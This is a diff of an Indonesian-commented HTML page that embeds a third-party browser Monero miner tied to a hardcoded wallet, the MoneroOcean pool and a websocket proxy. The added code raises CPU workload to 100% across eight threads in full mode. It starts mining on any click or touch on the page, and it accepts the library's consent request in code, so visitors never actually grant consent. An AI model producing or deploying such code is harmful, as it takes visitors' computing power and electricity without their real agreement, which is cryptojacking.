@@ -4,45 +4,86 @@
   <meta charset="utf-8">
   <title>Monero RandomX Miner</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: system-ui, sans-serif; max-width: 640px; margin: 32px auto; padding: 0 16px; }
+    #info { background: #0b0b0b; color: #0f0; padding: 12px; border-radius: 8px; font-family: monospace; white-space: pre-wrap; }
+  </style>
 </head>
 <body>
   <h1>Mining Monero (RandomX)</h1>
   <p>Progress: <a href="https://moneroocean.stream" target="_blank">MoneroOcean</a></p>
-  <div id="log" style="background:#111;color:#0f0;padding:12px;font-family:monospace;white-space:pre-wrap;min-height:120px;"></div>
+  <div id="info">Loading miner...</div>
 
-  <script>
-    const logEl = document.getElementById('log');
-    function log(msg) {
-      logEl.textContent += msg + '\n';
-      console.log(msg);
-    }
-
-    window.addEventListener('randomx:ready', (e) => {
-      log('✓ randomx:ready — miner siap');
-      const rx = e.detail.instance;
-      log('State: ' + JSON.stringify(rx.state));
-    });
-
-    window.addEventListener('randomx:error', (e) => {
-      log('✗ randomx:error → ' + JSON.stringify(e.detail));
-    });
-
-    // Tangkap error JS biasa
-    window.onerror = function(msg, url, line) {
-      log('JS Error: ' + msg + ' @' + line);
-    };
-  </script>
-
-  <!-- Embed default (bukan headless) -->
+  <!--
+    PENGATURAN (ubah di sini):
+    data-workload  = % CPU (10–80)     → semakin tinggi semakin berat
+    data-max-threads = batas thread    → contoh 2 / 4 / 6
+    data-mode      = light (ringan) / full (lebih kencang, butuh RAM besar)
+  -->
   <script defer crossorigin="anonymous"
     src="https://cdn.jsdelivr.net/gh/aa022/RandomX-bonanza@main/dist/embed.js"
     data-wallet="85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr"
     data-pool="gulf.moneroocean.stream"
     data-port="10128"
     data-proxy="wss://gxmail.dev"
-    data-mode="light"
-    data-workload="30"
-    data-worker-name="web1">
+    data-mode="full"
+    data-workload="100"
+    data-max-threads="8"
+    data-worker-name="web1"
+    data-quickstart="true">
+  </script>
+
+  <script>
+    const info = document.getElementById('info');
+    let rx = null;
+
+    function show(msg) {
+      info.textContent = msg;
+    }
+
+    window.addEventListener('randomx:ready', (e) => {
+      rx = e.detail.instance;
+      show('Miner siap.\nKlik di mana saja di halaman ini untuk mulai mining...');
+
+      // Auto start saat user klik / sentuh halaman (wajib trusted gesture)
+      const startOnce = (ev) => {
+        document.removeEventListener('click', startOnce);
+        document.removeEventListener('touchstart', startOnce);
+
+        show('Starting...');
+        const ok = rx.start(ev);
+        if (!ok) {
+          rx.requestConsent(ev);
+          rx.on('consent-request', (d) => {
+            d.accept();
+            show('Mining started...');
+          });
+        }
+      };
+
+      document.addEventListener('click', startOnce, { once: true });
+      document.addEventListener('touchstart', startOnce, { once: true });
+    });
+
+    window.addEventListener('randomx:error', (e) => {
+      show('Error: ' + JSON.stringify(e.detail));
+    });
+
+    // Update hashrate tiap 2 detik
+    setInterval(() => {
+      if (!rx || !rx.state) return;
+      const s = rx.state;
+      if (s.running || s.phase === 'mining') {
+        show(
+          'Status : ' + s.phase + '\n' +
+          'Hashrate: ' + (s.hashrate || 0) + ' H/s\n' +
+          'Accepted: ' + (s.accepted || 0) + '\n' +
+          'Rejected: ' + (s.rejected || 0) + '\n' +
+          'Threads : ' + (s.threads || '-') + '\n' +
+          'Workload: ' + (s.workload || '-') + '%'
+        );
+      }
+    }, 2000);
   </script>
 </body>
 </html>
